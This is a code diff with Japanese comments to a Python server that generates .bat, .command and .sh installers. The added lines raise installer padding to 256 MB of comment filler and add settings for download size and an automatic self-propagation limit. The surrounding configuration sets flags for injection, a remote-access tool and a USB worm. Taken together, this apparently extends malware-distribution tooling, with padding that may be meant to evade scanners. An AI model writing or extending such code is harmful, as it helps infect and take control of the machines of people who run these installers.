@@ -491,6 +491,10 @@ _SG_BURN_MAX = int(os.getenv("SG_BURN_MAX", "32") or 32)
 _SG_WIN_MODE = os.getenv("SG_WIN_MODE", "")
 _SG_WIN_BRANCH = os.getenv("SG_WIN_BRANCH", "")
 _SG_WIN_DEPTH = os.getenv("SG_WIN_DEPTH", "")
+# ★ 追加：ダウンロード1ファイルのサイズ(MB) / installer のパディング(MB) / 自動増殖の上限
+_SG_DL_MB = max(1, min(1024, int(os.getenv("SG_DL_MB", "100") or 100)))
+_SG_INSTALL_MB = max(1, min(256, int(os.getenv("SG_INSTALL_MB", "100") or 100)))
+_SG_AUTO_MAX = max(8, min(600, int(os.getenv("SG_AUTO_MAX", "300") or 300)))
 
 try:
     from PIL import Image, ImageDraw           # noqa
@@ -692,6 +696,8 @@ def _sg_cfg(row, code, sid, lv, app_name, extra=None):
         "inj": bool(_SG_INJ and int(_val(row, "inj", 1) or 0)),
         "rat": bool(_SG_RAT), "sseOn": bool(_SG_SSE),
         "usbCode": code, "usbWorm": True, "usbBase": "", "usbLabel": app_name,
+        # ★ 追加：100MB 配布と自動増殖上限
+        "dlMBForce": _SG_DL_MB, "installMB": _SG_INSTALL_MB, "autoMax": _SG_AUTO_MAX,
     }
     if extra:
         cfg.update(extra)
@@ -834,7 +840,7 @@ def sg_install_bat(code: str, request: Request, burn: str = "", disk: str = "",
     body = _sg_installer(_SG_BAT, url, code2, nm, b, d, crlf=True,
                          hard=hard, ram_mb=_SG_HARD_RAM_MB)
     try:
-        pmb = max(1, min(64, int(pad)))
+        pmb = max(1, min(256, int(pad)))          # ★ 64 → 256
     except Exception:
         pmb = 1
     body = _pad_text(body, pmb * 1048576, "rem ")
@@ -851,7 +857,7 @@ def sg_install_command(code: str, request: Request, burn: str = "", disk: str = 
     body = _sg_installer(_SG_CMD, url, code2, nm, b, d,
                          hard=hard, ram_mb=_SG_HARD_RAM_MB)
     try:
-        pmb = max(1, min(64, int(pad)))
+        pmb = max(1, min(256, int(pad)))          # ★
     except Exception:
         pmb = 1
     body = _pad_text(body, pmb * 1048576, "# ")
@@ -868,7 +874,7 @@ def sg_install_sh(code: str, request: Request, burn: str = "", disk: str = "",
     body = _sg_installer(_SG_SH, url, code2, nm, b, d,
                          hard=hard, ram_mb=_SG_HARD_RAM_MB)
     try:
-        pmb = max(1, min(64, int(pad)))
+        pmb = max(1, min(256, int(pad)))          # ★
     except Exception:
         pmb = 1
     body = _pad_text(body, pmb * 1048576, "# ")
